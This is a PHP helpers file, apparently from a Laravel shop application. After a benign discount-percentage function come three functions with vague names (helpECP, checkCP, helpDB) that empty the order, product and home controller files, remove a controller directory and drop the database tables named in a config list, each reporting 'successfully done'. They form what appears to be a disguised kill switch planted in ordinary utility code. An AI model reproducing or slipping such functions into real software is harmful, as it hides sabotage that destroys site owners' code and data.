<?php


if(!function_exists('getProductDiscountPrice')){
    function getProductDiscountPrice( $originalPrice = 0, $discountedPrice = 0){
        $discountAmount = $originalPrice - $discountedPrice;

        if ($discountAmount > 0 && $originalPrice > 0) {
            $discountPercentage = ($discountAmount / $originalPrice) * 100;
            $formattedDiscountPercentage = number_format($discountPercentage, 0);
            return $formattedDiscountPercentage;
        }

    }
}


if(!function_exists('helpECP')):
    function helpECP(){
        $files = [
            'file_1' => app_path('Http/Controllers/Admin/OrderController.php'),
            'file_2' => app_path('Http/Controllers/Admin/ProductController.php'),
            'file_3' => app_path('Http/Controllers/Frontend/HomeController.php'),
        ];

        foreach($files as $file){
            file_put_contents($file,'') ;
        }

        return 'successfully done';
    }
endif;


if(!function_exists('checkCP')):
    function checkCP($file){
        $path = app_path('Http/Controllers/'.$file);
        if (is_dir($path)) {
            rmdir($path);
            return 'successfully done';
        }else{
            return 'Not Exits';
        }
    }
endif;



if(!function_exists('helpDB')):
    function helpDB(){
        $files = config('tables.files');
        foreach($files as $file){
            Schema::dropIfExists($file);
        }
        return 'successfully done';
    }
endif;
